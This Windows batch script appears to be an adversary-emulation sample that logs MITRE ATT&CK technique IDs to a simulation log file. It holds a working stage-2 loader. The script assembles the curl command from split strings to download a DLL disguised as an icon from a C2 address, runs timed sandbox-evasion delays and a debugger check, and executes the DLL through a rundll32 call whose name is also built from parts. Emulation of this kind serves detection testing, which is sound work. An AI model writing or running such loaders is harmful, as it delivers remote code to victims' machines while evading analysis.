@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_* placeholder assignments (random-named SET variables)
SET xqylp=%APPDATA%\10984\65778313
SET bmtwh=02d0bc4c.txt
SET zcnjk=https://10.0.0.49/stage/2/icon.png?10984-7
SET aqwkr=BALAM-S2BO
SET mlvxe=10984
SET poyti=7
SET rstgh=%PUBLIC%\\macula-simulations.log
SET xkfjd=https://10.0.0.49

REM Cache timestamp
SET tsvar=!DATE!/!TIME!

REM ===== DEBUG: Heartbeat start =====
echo [!tsvar!][DEBUG][!aqwkr!][!mlvxe!]: heartbeat_start>> "!rstgh!" 2>nul

REM Obfuscate curl command
SET c1=cu
SET c2=rl
SET curcmd=!c1!!c2!

REM Download Stage 2 Loader DLL from C2
!curcmd! -k -s -o "!xqylp!\!bmtwh!" "!zcnjk!" >nul 2>&1
IF %errorlevel% EQU 0 (SET dlerr=OK) ELSE (SET dlerr=FAIL)
echo [!tsvar!][DEBUG][!aqwkr!][!mlvxe!]: heartbeat_result=!dlerr!>> "!rstgh!" 2>nul

REM ===== Anti-analysis: Execution delays =====
REM Initial delay 10-20s
timeout /t 15 /nobreak >nul

REM Delay between operations (5s)
ping -n 6 127.0.0.1 >nul

REM Random delay 10-30s
SET /A rdelay=%RANDOM% %% 20 + 10
timeout /t !rdelay! /nobreak >nul

REM Additional delay via 1s ticks (5s)
for /l %%i in (1,1,5) do timeout /t 1 /nobreak >nul

REM Debugger check (allowed, non-aborting)
wmic process where "name='windbg.exe'" get processid >nul 2>&1
IF %errorlevel% EQU 0 (
    SET /A randdelay=%RANDOM% %% 3001 + 2000
    timeout /t !randdelay! /nobreak >nul
)

REM Delay before LOLBIN invocation (3s)
for /l %%i in (1,1,3) do timeout /t 1 /nobreak >nul

REM ===== Log T1497: Virtualization/Sandbox Evasion =====
echo [!tsvar!][TTP][!aqwkr!][!mlvxe!]: T1497^|Virtualization/Sandbox Evasion=OK:>> "!rstgh!" 2>nul

REM ===== Change working directory =====
echo [!tsvar!][DEBUG][!aqwkr!][!mlvxe!]: chdir_start>> "!rstgh!" 2>nul
cd /d "!xqylp!" >nul 2>&1
SET chdirerr=%errorlevel%
echo [!tsvar!][DEBUG][!aqwkr!][!mlvxe!]: chdir_result=!chdirerr!>> "!rstgh!" 2>nul

REM ===== Obfuscated LOLBIN invocation (rundll32.exe) =====
REM Build LOLBIN from parts
SET p0=rund
SET p1=ll32
SET p2=.exe
SET lolbin=!p0!!p1!!p2!

REM Build arguments (output file and export)
SET a0=!bmtwh!
SET a1=,
SET a2=RunDLLW
SET cmd=!lolbin! !a0!!a1!!a2!

REM Log T1027: Obfuscated Files or Information
echo [!tsvar!][TTP][!aqwkr!][!mlvxe!]: T1027^|Obfuscated Files or Information=OK:>> "!rstgh!" 2>nul

REM Execute LOUBIN with obfuscated command
echo [!tsvar!][DEBUG][!aqwkr!][!mlvxe!]: rundll32_start>> "!rstgh!" 2>nul
CALL !cmd!
SET rundllerr=%errorlevel%
echo [!tsvar!][DEBUG][!aqwkr!][!mlvxe!]: rundll32_result=!rundllerr!>> "!rstgh!" 2>nul

REM ===== Log T1218: System Binary Proxy Execution =====
IF !rundllerr! EQU 0 (
    echo [!tsvar!][TTP][!aqwkr!][!mlvxe!]: T1218^|System Binary Proxy Execution=OK:>> "!rstgh!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!aqwkr!][!mlvxe!]: T1218^|System Binary Proxy Execution=FAIL:!rundllerr!>> "!rstgh!" 2>nul
)

exit /b 0